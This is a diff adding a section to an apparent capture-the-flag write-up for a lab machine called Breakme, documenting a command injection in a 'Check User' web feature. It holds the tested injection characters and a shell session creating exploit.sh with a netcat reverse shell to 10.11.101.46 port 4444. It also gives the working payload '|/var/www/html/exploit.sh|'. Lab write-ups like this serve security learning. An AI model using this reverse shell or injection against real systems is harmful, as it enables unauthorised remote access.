@@ -320,11 +320,74 @@ www-data@Breakme:/tmp$ 2024/10/25 01:06:32 client: Connecting to ws://10.11.101.
 
 ```bash
  - First we input the name normaly john --> We recieved the result message: "User john not found"
- - Second we add special character like (:) we recieved the message: "User john: not found" but with different special character like "" or , we recieved the message same : "User john not found" and the special character being replaced.
+ - Second we add special character like (:) we recieved the message: "User john: not found" but with different special character like "" ,, or || --> we recieved the message same : "User john not found" and the special character being replaced.
  ```  
  --> The vulnerable "Command Injection" is available in the fearture "Check User".
 
 -----------------------------
- EXPLOIT COMMAND INJECTION
+ EXPLOIT COMMAND INJECTION:
++ Type: Verbose Command Injection.
++ After testing some special characters in list we created 
+```
+`
+|| 
+; 
+'
+" 
+&
+>
+/ 
+!
+:
+{}
+[]
+()
+```
+--> We've recieved result message:
+```
+User ||/:{} found
+``` 
++ So we can use this character to inject into command but not replaced.
+
+```
+We create file bash in path server /var/www/html and then write payload to create reverseshell. After that we write path file bash into command field and use netcat to capture the listen port. 
+```
+
+```
+www-data@Breakme:/$ cd /var/www/ 
+www-data@Breakme:/var/www$ ls
+html
+www-data@Breakme:/var/www$ cd html/
+www-data@Breakme:/var/www/html$ ls
+index.html  wordpress
+www-data@Breakme:/var/www/html$ ls -l
+total 16
+-rwxr-xr-x 1 www-data www-data 10701 Aug 17  2021 index.html
+drwxr-xr-x 5 www-data www-data  4096 Oct 25 06:17 wordpress
+www-data@Breakme:/var/www/html$ touch exploit.sh
+www-data@Breakme:/var/www/html$ ls
+exploit.sh  index.html	wordpress
+www-data@Breakme:/var/www/html$ echo '#!/bin/bash' > exploit.sh 
+<mp/f|/bin/bash -i 2>&1|nc 10.11.101.46 4444 >/tmp/f' >> exploit.sh 
+www-data@Breakme:/var/www/html$ cat exploit.sh 
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.11.101.46 4444 >/tmp/f
+www-data@Breakme:/var/www/html$ chmod +x exploit.sh 
+www-data@Breakme:/var/www/html$ ls -l
+total 20
+-rwxrwxrwx 1 www-data www-data    94 Oct 25 06:52 exploit.sh
+-rwxr-xr-x 1 www-data www-data 10701 Aug 17  2021 index.html
+drwxr-xr-x 5 www-data www-data  4096 Oct 25 06:17 wordpress
+www-data@Breakme:/var/www/html$ 
+```
+
++ The first try, we run command:
+```
+/var/www/html/exploit.sh
+```
+but netcat can not capture the listner port so we continute add some special character and finally success with payload |/var/www/html/exploit.sh|
+
+![alt text](image-13.png)
+
 
 
